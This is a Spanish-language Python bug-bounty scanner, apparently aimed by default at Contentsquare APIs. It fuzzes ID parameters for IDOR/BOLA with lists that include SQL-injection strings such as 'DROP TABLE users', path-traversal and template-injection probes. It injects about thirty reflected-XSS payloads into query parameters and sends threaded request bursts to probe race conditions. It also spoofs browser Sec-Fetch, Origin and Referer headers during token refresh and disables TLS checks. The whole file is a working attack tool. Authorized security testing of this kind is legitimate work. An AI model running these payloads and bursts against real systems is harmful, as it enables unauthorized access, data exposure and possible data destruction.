#!/usr/bin/env python3
"""
bug_hunter.py — Herramienta multi-propósito para Bug Bounty (v5).
================================================================
Novedades v5:
- Refresh de token corregido: ahora envía Origin/Referer del frontend.
- Content-Type correcto (text/plain;charset=UTF-8).
- Headers Sec-Fetch-* para simular petición del navegador.
- Configuración interactiva del Origin/Referer.
"""

import os
import sys
import time
import re
import json
import base64
import threading
import requests
import urllib3
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIGURACIÓN GLOBAL
# ============================================================

REQUESTS_PER_MINUTE = 60
DELAY = 60.0 / REQUESTS_PER_MINUTE
TIMEOUT = 10
OUTPUT_FILE = os.path.join(os.path.expanduser("~"), "resultados_bugbounty.txt")

USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
)

# Configuración de refresh de token (se rellena interactivamente)
TOKEN_REFRESH = {
    "enabled": False,
    "endpoint": None,
    "method": "POST",
    "body": "{}",
    "response_path": "payload.accessToken",
    "cookies": None,
    "content_type": "text/plain;charset=UTF-8",
    "origin": None,
}

# ============================================================
# PAYLOADS
# ============================================================

IDOR_PAYLOADS = [
    "1", "2", "3", "10", "100", "1000", "10000",
    "admin", "test", "user", "guest", "root", "administrator",
    "null", "undefined", "0", "-1", "999999", "9999999",
    "../", "..%2f", "%2e%2e%2f", "....//", "..\\", "..%5c",
    "1' OR '1'='1", "1 OR 1=1", "1; DROP TABLE users--", "' OR '1'='1",
    "${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}",
    "0000", "0001", "1234", "12345",
    "00000000-0000-0000-0000-000000000000",
    "11111111-1111-1111-1111-111111111111",
    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x onerror=alert(1)//>",
    "<svg><script>alert(1)</script></svg>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<isindex action=javascript:alert(1) type=submit>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "javascript:alert(1)//",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1) onerror=alert(2)>",
    "<svg/onload=alert(1) onload=alert(2)>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
]

# ============================================================
# PATRONES DE DETECCIÓN IDOR
# ============================================================

COMMON_ID_PARAMS = {
    "id", "user_id", "userId", "account_id", "accountId", "project_id", "projectId",
    "item_id", "itemId", "product_id", "productId", "order_id", "orderId",
    "customer_id", "customerId", "object_id", "objectId", "resource_id", "resourceId",
    "guid", "uuid", "key", "ref", "reference", "pid", "uid"
}

ID_PATTERNS = [
    (re.compile(r"^\d+$"), "numérico"),
    (re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I), "UUID"),
    (re.compile(r"^[0-9a-f]{16,}$", re.I), "hex_hash"),
]

# ============================================================
# UTILIDADES
# ============================================================

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}")

def save_result(text):
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def request_with_limit(url, method="GET", headers=None, data=None, params=None,
                       allow_redirects=True):
    time.sleep(DELAY)
    try:
        return requests.request(
            method, url,
            headers=headers, data=data, params=params,
            timeout=TIMEOUT, verify=False, allow_redirects=allow_redirects,
        )
    except Exception as e:
        log(f"Error en petición a {url}: {e}", "ERROR")
        return None

def build_headers(token=None):
    h = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h

def normalize_endpoint(ep):
    ep = ep.strip()
    if not ep:
        return None
    if ep.startswith("http://") or ep.startswith("https://"):
        parsed = urlparse(ep)
        path = parsed.path
        if parsed.query:
            path += "?" + parsed.query
        ep = path
    if not ep.startswith("/"):
        ep = "/" + ep
    return ep

# ============================================================
# UTILIDADES DE JWT
# ============================================================

def decode_jwt_payload(token):
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        payload = parts[1]
        payload += "=" * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return None

def get_token_expiry(token):
    data = decode_jwt_payload(token)
    if data and "exp" in data:
        return data["exp"]
    return None

def token_expires_soon(token, threshold_seconds=60):
    exp = get_token_expiry(token)
    if exp is None:
        return False
    return (exp - time.time()) < threshold_seconds

def token_time_remaining(token):
    exp = get_token_expiry(token)
    if exp is None:
        return None
    return max(0, int(exp - time.time()))

# ============================================================
# CONFIGURACIÓN INTERACTIVA
# ============================================================

def configure_user_agent():
    global USER_AGENT

    print("\n" + "=" * 60)
    print("  CONFIGURACIÓN DEL USER-AGENT")
    print("=" * 60)
    print(f"User-Agent actual:\n  {USER_AGENT}\n")
    print("Algunos programas exigen un sufijo específico para identificar")
    print("tu tráfico como bug hunter (ej. 'CS_YWH/BB', 'HackerOne', etc.).")
    print("Si no lo incluyes, pueden bloquear tu IP o rechazar tus reportes.\n")

    respuesta = input("¿Necesitas modificar el User-Agent? (s/N): ").strip().lower()
    if respuesta != "s":
        log("Manteniendo User-Agent por defecto.")
        return

    print("\nOpciones:")
    print("  1. Añadir un sufijo al final (ej. ' CS_YWH/BB')")
    print("  2. Reemplazar el User-Agent completo")
    print("  3. Cancelar")

    opcion = input("\nElige una opción (1/2/3): ").strip()

    if opcion == "1":
        sufijo = input("Introduce el sufijo (ej. ' CS_YWH/BB'): ").strip()
        if sufijo and not sufijo.startswith(" "):
            sufijo = " " + sufijo
        USER_AGENT = USER_AGENT + sufijo
        log("User-Agent actualizado.")
    elif opcion == "2":
        nuevo_ua = input("Introduce el User-Agent completo: ").strip()
        if nuevo_ua:
            USER_AGENT = nuevo_ua
            log("User-Agent reemplazado.")
        else:
            log("No se introdujo nada. Manteniendo el original.", "WARN")
    else:
        log("Cancelado. Manteniendo User-Agent por defecto.")

    print(f"\n✅ User-Agent final:\n  {USER_AGENT}\n")


def configure_token_refresh():
    """Configura (opcionalmente) el endpoint de refresh de token."""
    global TOKEN_REFRESH

    print("\n" + "=" * 60)
    print("  CONFIGURACIÓN DE REFRESH DE TOKEN (opcional)")
    print("=" * 60)
    print("Si tu objetivo tiene un endpoint para renovar el token (ej. POST /v2/auth/refresh),")
    print("el script podrá renovarlo automáticamente cuando caduque.\n")

    resp = input("¿Tienes un endpoint para renovar el token? (s/N): ").strip().lower()
    if resp != "s":
        log("Refresh de token desactivado.")
        return

    endpoint = input("Endpoint de refresh (ej. /v2/auth/refresh): ").strip()
    if not endpoint:
        log("Endpoint vacío. Refresh desactivado.", "WARN")
        return
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint

    method = input("Método HTTP [por defecto POST]: ").strip().upper() or "POST"
    body = input("Body [por defecto {}]: ").strip() or "{}"
    response_path = input("Ruta del token en la respuesta [por defecto payload.accessToken]: ").strip() or "payload.accessToken"

    origin = input("Origin/Referer URL (ej. https://app.contentsquare.com): ").strip()
    if not origin:
        origin = "https://app.contentsquare.com"
    origin = origin.rstrip("/")

    print("\n¿El endpoint de refresh requiere cookies? (ej. CS_SESSION_ID=...)")
    cookies_raw = input("Cookies (deja vacío si no es necesario): ").strip()
    cookies = cookies_raw if cookies_raw else None

    TOKEN_REFRESH = {
        "enabled": True,
        "endpoint": endpoint,
        "method": method,
        "body": body,
        "response_path": response_path,
        "cookies": cookies,
        "content_type": "text/plain;charset=UTF-8",
        "origin": origin,
    }

    log(f"✅ Refresh configurado: {method} {endpoint}")
    log(f"   Token se buscará en: {response_path}")
    log(f"   Origin/Referer: {origin}")
    if cookies:
        log(f"   Cookies: {cookies[:50]}{'...' if len(cookies) > 50 else ''}")


def refresh_token(base_url, current_token):
    """Renueva el token usando el endpoint configurado (headers exactos de Burp)."""
    if not TOKEN_REFRESH["enabled"]:
        return None

    url = base_url.rstrip("/") + TOKEN_REFRESH["endpoint"]
    body_str = TOKEN_REFRESH["body"]

    # Headers exactos según la petición válida de Burp
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": TOKEN_REFRESH["content_type"],
        "Content-Length": str(len(body_str)),
        "Authorization": f"Bearer {current_token}",
        "Origin": TOKEN_REFRESH["origin"],
        "Referer": TOKEN_REFRESH["origin"] + "/",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Connection": "close",
    }

    if TOKEN_REFRESH["cookies"]:
        headers["Cookie"] = TOKEN_REFRESH["cookies"]

    log(f"🔄 Renovando token en {url}...")

    try:
        resp = requests.request(
            TOKEN_REFRESH["method"],
            url,
            headers=headers,
            data=body_str,
            timeout=TIMEOUT,
            verify=False,
        )
    except Exception as e:
        log(f"Error renovando token: {e}", "ERROR")
        return None

    if resp.status_code not in (200, 201):
        log(f"Refresh falló con status {resp.status_code}: {resp.text[:200]}", "ERROR")
        if "NO_SESSION_ERROR" in resp.text:
            log("⚠️  La cookie CS_SESSION_ID ha caducado.", "WARN")
            log("   → Ve al navegador, refresca app.contentsquare.com y vuelve a loguearte.", "WARN")
            log("   → Copia las cookies nuevas de Burp y reinicia el script.", "WARN")
        return None

    try:
        data = resp.json()
    except Exception:
        log("La respuesta del refresh no es JSON", "ERROR")
        return None

    parts = TOKEN_REFRESH["response_path"].split(".")
    current = data
    for part in parts:
        if isinstance(current, dict) and part in current:
            current = current[part]
        else:
            log(f"No se encontró '{part}' en la respuesta del refresh", "ERROR")
            return None

    if not isinstance(current, str) or len(current) < 20:
        log("El token extraído no parece válido", "ERROR")
        return None

    remaining = token_time_remaining(current)
    if remaining is not None:
        log(f"✅ Token renovado. Válido por {remaining}s más.")
    else:
        log(f"✅ Token renovado (últimos 10 chars: ...{current[-10:]})")

    save_result(f"[TOKEN] Renovado a las {datetime.now().isoformat()}")
    return current


def maybe_refresh_token(base_url, token):
    """Renueva el token si está a punto de caducar."""
    if not TOKEN_REFRESH["enabled"]:
        return token

    remaining = token_time_remaining(token)
    if remaining is not None and remaining < 60:
        log(f"⚠️  Token caduca en {remaining}s. Renovando automáticamente...", "WARN")
        new_token = refresh_token(base_url, token)
        return new_token if new_token else token
    return token


def request_endpoints():
    print("\n" + "=" * 60)
    print("  LISTA DE ENDPOINTS")
    print("=" * 60)
    print("Pega los endpoints uno por línea.")
    print("Puedes pegar URLs completas (https://...) o solo el path (/api/...).")
    print("El script detectará automáticamente los parámetros IDOR.")
    print("Cuando termines, escribe 'FIN' en una línea vacía.\n")

    endpoints = []
    while True:
        line = input().strip()
        if line.upper() == "FIN":
            break
        if line:
            endpoints.append(line)

    if not endpoints:
        log("No se proporcionaron endpoints. Saliendo.", "ERROR")
        sys.exit(1)

    cleaned = []
    for ep in endpoints:
        norm = normalize_endpoint(ep)
        if norm:
            cleaned.append(norm)

    log(f"Se cargaron {len(cleaned)} endpoints (normalizados).")
    return cleaned


def request_base_url():
    print("\n" + "=" * 60)
    print("  URL BASE")
    print("=" * 60)
    base_url = input("URL base (ej. https://webapi.contentsquare.com): ").strip()
    if not base_url:
        log("URL base no proporcionada. Saliendo.", "ERROR")
        sys.exit(1)
    return base_url


def check_token(base_url, token=None):
    log("Verificando si el sistema requiere token...")
    test_url = f"{base_url.rstrip('/')}/v1/me"
    headers = build_headers(token)

    resp = request_with_limit(test_url, headers=headers)
    if resp is None:
        return token

    if resp.status_code == 401:
        log("El endpoint requiere autenticación (401).", "WARN")
        if token:
            log("El token proporcionado no es válido o ha expirado.", "ERROR")
        nuevo = input("Introduce un token JWT válido: ").strip()
        return nuevo
    elif resp.status_code == 200:
        log("Token válido (o no requerido).")
        return token
    else:
        log(f"Respuesta inesperada ({resp.status_code}). Continuando...", "WARN")
        return token

# ============================================================
# DETECCIÓN AUTOMÁTICA DE PARÁMETROS IDOR
# ============================================================

def detect_idor_parameters(endpoint):
    injection_points = []
    parsed = urlparse(endpoint)
    path_segments = parsed.path.strip("/").split("/")
    query_params = parse_qs(parsed.query)

    for idx, segment in enumerate(path_segments):
        if not segment or segment.lower() in ("api", "v1", "v2", "v3", "v4", "v5"):
            continue
        for pattern, pattern_name in ID_PATTERNS:
            if pattern.match(segment):
                injection_points.append({
                    "type": "path",
                    "index": idx,
                    "original_value": segment,
                    "param_name": None,
                })
                break

    for param_name, values in query_params.items():
        for value in values:
            if param_name.lower() in [p.lower() for p in COMMON_ID_PARAMS]:
                injection_points.append({
                    "type": "query",
                    "index": None,
                    "original_value": value,
                    "param_name": param_name,
                })
                break
            for pattern, pattern_name in ID_PATTERNS:
                if pattern.match(value):
                    injection_points.append({
                        "type": "query",
                        "index": None,
                        "original_value": value,
                        "param_name": param_name,
                    })
                    break
            else:
                continue
            break

    return injection_points


def build_mutated_endpoint(endpoint, injection_point, payload):
    parsed = urlparse(endpoint)

    if injection_point["type"] == "path":
        segments = parsed.path.strip("/").split("/")
        idx = injection_point["index"]
        segments[idx] = payload
        new_path = "/" + "/".join(segments)
        new_parsed = parsed._replace(path=new_path)
    else:
        qs = parse_qs(parsed.query)
        param_name = injection_point["param_name"]
        qs[param_name] = [payload]
        new_query = urlencode(qs, doseq=True)
        new_parsed = parsed._replace(query=new_query)

    return urlunparse(new_parsed)

# ============================================================
# FASE 1: IDOR / BOLA
# ============================================================

def test_idor_bola(base_url, endpoints, token=None):
    log("=" * 60)
    log("FASE 1: IDOR / BOLA (detección automática)")
    log("=" * 60)

    token = maybe_refresh_token(base_url, token)

    headers = build_headers(token)
    results = []
    tested_endpoints = 0
    total_requests = 0

    for idx_ep, endpoint in enumerate(endpoints, 1):
        injection_points = detect_idor_parameters(endpoint)

        if not injection_points:
            log(f"[{idx_ep}/{len(endpoints)}] {endpoint} → Sin parámetros IDOR detectados.")
            continue

        tested_endpoints += 1
        log(f"[{idx_ep}/{len(endpoints)}] {endpoint} → {len(injection_points)} punto(s) de inyección.")

        for point in injection_points:
            location = f"path[{point['index']}]" if point['type'] == 'path' else f"query[{point['param_name']}]"
            log(f"    → Punto IDOR: {location} (valor original: {point['original_value']})")

            for payload in IDOR_PAYLOADS:
                # Renovar token cada 100 peticiones
                if total_requests > 0 and total_requests % 100 == 0:
                    token = maybe_refresh_token(base_url, token)
                    headers = build_headers(token)

                mutated_path = build_mutated_endpoint(endpoint, point, payload)
                url = base_url.rstrip("/") + mutated_path

                resp = request_with_limit(url, headers=headers)
                if resp is None:
                    continue

                total_requests += 1
                status = resp.status_code
                length = len(resp.content)
                snippet = resp.text[:150].replace("\n", " ")

                if status in (200, 201):
                    msg = f"[IDOR?] {status} {url} | Punto: {location} | Len: {length} | {snippet}"
                    log(f"    🎯 {msg}", "VULN")
                    results.append(msg)
                    save_result(msg)
                elif status == 403:
                    print(f"    [{payload}] 403 {url}", end="\r")
                elif status == 404:
                    print(f"    [{payload}] 404 {url}", end="\r")
                elif status == 401:
                    print(f"    [{payload}] 401 {url}", end="\r")
                elif status == 500:
                    print(f"    [{payload}] 500 {url}", end="\r")

        print()

    log(f"Resumen IDOR: {tested_endpoints} endpoints, {total_requests} peticiones.")
    return results

# ============================================================
# FASE 2: XSS REFLEJADO
# ============================================================

def test_xss(base_url, endpoints, token=None):
    log("=" * 60)
    log("FASE 2: XSS REFLEJADO")
    log("=" * 60)

    token = maybe_refresh_token(base_url, token)

    log(f"Endpoints a probar: {len(endpoints)}")
    log(f"Payloads por endpoint: {len(XSS_PAYLOADS)}")
    total_requests = len(endpoints) * len(XSS_PAYLOADS)
    log(f"Total estimado: {total_requests} peticiones (~{total_requests}s)")

    headers = build_headers(token)
    results = []
    request_count = 0

    for idx_ep, endpoint in enumerate(endpoints, 1):
        base_path = endpoint.replace("{id}", "1")
        base_url_full = base_url.rstrip("/") + base_path

        parsed = urlparse(base_url_full)
        qs = parse_qs(parsed.query)

        if not qs:
            qs["xss"] = [""]

        log(f"[{idx_ep}/{len(endpoints)}] {endpoint}")

        for param in list(qs.keys()):
            for idx_pl, payload in enumerate(XSS_PAYLOADS, 1):
                if request_count > 0 and request_count % 100 == 0:
                    token = maybe_refresh_token(base_url, token)
                    headers = build_headers(token)

                new_qs = {k: v[:] for k, v in qs.items()}
                new_qs[param] = [payload]
                new_query = urlencode(new_qs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                resp = request_with_limit(new_url, headers=headers)
                if resp is None:
                    continue

                request_count += 1
                body = resp.text
                if payload in body:
                    msg = f"[XSS?] {new_url} | Payload reflejado sin escapar."
                    log(f"    🎯 {msg}", "VULN")
                    results.append(msg)
                    save_result(msg)
                else:
                    print(f"    [{idx_pl}/{len(XSS_PAYLOADS)}] {param} → sin reflejo", end="\r")

        print()

    return results

# ============================================================
# FASE 3: RACE CONDITION
# ============================================================

def test_race_condition(base_url, endpoints, token=None, threads=10, iterations=5):
    log("=" * 60)
    log("FASE 3: RACE CONDITION (experimental)")
    log("=" * 60)
    log("⚠️  Esta fase enviará ráfagas rápidas. Puede activar el WAF.", "WARN")
    confirm = input("¿Continuar? (s/N): ").strip().lower()
    if confirm != "s":
        log("Fase de race condition omitida.")
        return []

    token = maybe_refresh_token(base_url, token)

    headers = build_headers(token)
    results = []

    candidates = [
        ep for ep in endpoints
        if any(k in ep.lower() for k in [
            "create", "update", "delete", "apply", "redeem",
            "purchase", "transfer", "vote", "like", "follow",
            "invite", "share", "claim", "approve",
        ])
    ]

    if not candidates:
        log("No se encontraron endpoints candidatos para race condition.", "WARN")
        return []

    log(f"Endpoints candidatos: {len(candidates)}")

    for idx_ep, endpoint in enumerate(candidates, 1):
        url = base_url.rstrip("/") + endpoint.replace("{id}", "1")
        log(f"[{idx_ep}/{len(candidates)}] Probando race condition en: {url}")

        def worker():
            try:
                resp = requests.get(url, headers=headers, timeout=TIMEOUT, verify=False)
                if resp.status_code in (200, 201):
                    log(f"    🎯 [RACE?] {resp.status_code} {url}", "VULN")
                    results.append(url)
                    save_result(f"[RACE?] {resp.status_code} {url}")
            except Exception:
                pass

        for _ in range(iterations):
            threads_list = []
            for _ in range(threads):
                t = threading.Thread(target=worker)
                t.start()
                threads_list.append(t)
            for t in threads_list:
                t.join()
            time.sleep(0.5)

    return results

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 60)
    print("  BUG HUNTER MULTI-PROPÓSITO (v5)")
    print("=" * 60)

    configure_user_agent()
    configure_token_refresh()
    endpoints = request_endpoints()
    base_url = request_base_url()

    print("\n" + "=" * 60)
    print("  TOKEN DE AUTENTICACIÓN (opcional)")
    print("=" * 60)
    token = input("Token JWT (deja vacío si no es necesario): ").strip()
    if token:
        remaining = token_time_remaining(token)
        if remaining is not None:
            log(f"Token válido por {remaining}s más.")
        token = check_token(base_url, token)
    else:
        log("No se proporcionó token. Se probará sin autenticación.")

    idor_results = test_idor_bola(base_url, endpoints, token)
    xss_results = test_xss(base_url, endpoints, token)
    race_results = test_race_condition(base_url, endpoints, token, threads=10, iterations=5)

    log("=" * 60)
    log("RESUMEN FINAL")
    log("=" * 60)
    log(f"IDOR/BOLA     : {len(idor_results)} hallazgos")
    log(f"XSS           : {len(xss_results)} hallazgos")
    log(f"Race Condition: {len(race_results)} hallazgos")
    log(f"Resultados guardados en: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
